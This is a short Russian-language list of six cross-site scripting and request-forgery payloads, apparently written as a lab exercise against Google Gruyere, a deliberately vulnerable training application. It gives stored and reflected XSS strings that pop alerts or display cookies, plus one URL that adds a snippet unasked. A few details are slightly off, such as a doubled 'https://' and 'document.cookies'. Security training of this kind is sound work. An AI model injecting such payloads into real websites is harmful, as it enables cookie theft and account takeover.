# Payloads для gruyere

## Payload 1

На странице `https://google-gruyere.appspot.com/624951287337740559451525490507763176737/newsnippet.gtl` можно вставить в поле ввода `<a onmouseover="alert('xss')" href="#"><p>наведи на текст</p></a>` (Stored XSS)

## Payload 2

При переходе по ссылке `https://google-gruyere.appspot.com/624951287337740559451525490507763176737/newaccount.gtl` можно использовать специальный параметр newaccount.gtl. Если заменить его на `<script>alert('XSS')</script>`, то при переходе по ссылке откроется окно с надписью XSS.

## Payload 3

В случае, если при создании нового сниппета в поле будет вставлен код `<img src=1 onerror=alert(hi)>` , то при каждом посещении пользователем страницы «Сниппеты» или главной страницы (Stored XSS) будет появляться сообщение «hi».

## Payload 4
При замене ссылки `https://google-gruyere.appspot.com/624951287337740559451525490507763176737/newsnippet2?snippet=snippet` на ссылку  `https://google-gruyere.appspot.com/624951287337740559451525490507763176737/newsnippet2?snippet=update+snippet`, добавляется  новый сниппет

## Payload 5

При переходе по ссылке `https://https://google-gruyere.appspot.com/624951287337740559451525490507763176737/example`. Параметр example можно заменить на пейлоад `<script>alert(document.cookies)</script>` для выполнения Reflected XSS инъекции в элементе `<div id="search-query-param">...</div>`, который покажет куки файлы пользователя

## Payload 6

При смене цвета профиля можно добавить в строку profile color любой JavaScript-код, например blue `onmouseover='alert(document.cookie)`. Этот код выполнял Stored XSS-инъекцию, которая при наведении на моё имя аккаунта выводила файлы cookie пользователя.
